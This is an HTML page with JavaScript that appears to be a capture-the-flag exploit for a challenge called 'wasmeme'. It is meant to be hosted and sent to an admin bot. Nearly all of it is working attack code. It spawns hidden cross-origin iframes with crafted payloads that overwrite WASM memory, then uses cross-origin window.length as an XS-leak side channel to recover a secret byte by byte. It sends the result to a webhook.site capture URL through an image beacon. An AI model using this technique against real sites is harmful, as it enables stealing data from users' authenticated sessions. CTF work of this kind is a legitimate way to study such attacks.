<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>wasmeme oracle</title>
</head>
<body>
  <pre id="status">Starting wasmeme oracle…</pre>
  <script>
    // This page must be hosted on a public HTTPS URL and submitted to the challenge's
    // "Report to admin" form. The bot resolves chall.com inside its Docker network.
    const PROBE_ORIGIN = 'https://chall.com';

    // Replace this with your own request-capture URL before hosting this page.
    // The final flag is sent as the ?flag=... query parameter.
    const EXFIL_URL = 'https://webhook.site/a419f7e6-81c0-4bf8-a368-13dc1ed82071';

    const statusEl = document.getElementById('status');
    const printable = Array.from({ length: 95 }, (_, i) => String.fromCharCode(32 + i));

    function makePayload(position, guessedByte) {
      const bytes = new Uint8Array(21);
      // run() copies bytes[16..19] to WASM address 1360, used as the flag offset.
      bytes[16] = position & 0xff;
      bytes[17] = (position >>> 8) & 0xff;
      bytes[18] = (position >>> 16) & 0xff;
      bytes[19] = (position >>> 24) & 0xff;
      // bytes[20] overwrites the comparison byte at WASM address 1364.
      bytes[20] = guessedByte;
      return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
    }

    function findCharacter(position) {
      return new Promise((resolve) => {
        const candidates = [];
        let finished = false;

        const finish = (result) => {
          if (finished) return;
          finished = true;
          clearInterval(poll);
          clearTimeout(timeout);
          for (const frame of candidates) frame.remove();
          resolve(result);
        };

        for (const character of printable) {
          const frame = document.createElement('iframe');
          frame.setAttribute('aria-hidden', 'true');
          frame.style.cssText = 'position:absolute;left:-10000px;top:0;width:1px;height:1px;border:0;';
          const payload = makePayload(position, character.charCodeAt(0));
          frame.src = `${PROBE_ORIGIN}/admin/probe?data=${payload}`;
          candidates.push(frame);
          document.body.appendChild(frame);
        }

        // Cross-origin Window.length is readable. It becomes 1 only when the
        // probe's WASM check succeeds and the probe page appends its about:blank iframe.
        const poll = setInterval(() => {
          for (let i = 0; i < candidates.length; i++) {
            try {
              if (candidates[i].contentWindow && candidates[i].contentWindow.length > 0) {
                finish(printable[i]);
                return;
              }
            } catch (_) {
              // Ignore transient navigation errors and keep polling.
            }
          }
        }, 40);

        const timeout = setTimeout(() => finish(null), 45000);
      });
    }

    function sendFlag(flag) {
      const url = new URL(EXFIL_URL);
      url.searchParams.set('flag', flag);
      const beacon = new Image();
      beacon.src = url.toString();
    }

    async function run() {
      let flag = 'DH{';
      statusEl.textContent = 'Leaking flag…';

      try {
        for (let position = 3; position < 64; position++) {
          const character = await findCharacter(position);
          if (!character) throw new Error(`No printable byte matched at offset ${position}`);
          flag += character;
          statusEl.textContent = `Recovered ${position + 1} bytes`;
          if (character === '}') {
            statusEl.textContent = 'Done. Sending result.';
            sendFlag(flag);
            return;
          }
        }
        throw new Error('No closing brace found within the 64-byte WASM flag region');
      } catch (error) {
        statusEl.textContent = `Error: ${error.message}`;
        const url = new URL(EXFIL_URL);
        url.searchParams.set('error', error.message);
        url.searchParams.set('partial', flag);
        const beacon = new Image();
        beacon.src = url.toString();
      }
    }

    run();
  </script>
</body>
</html>
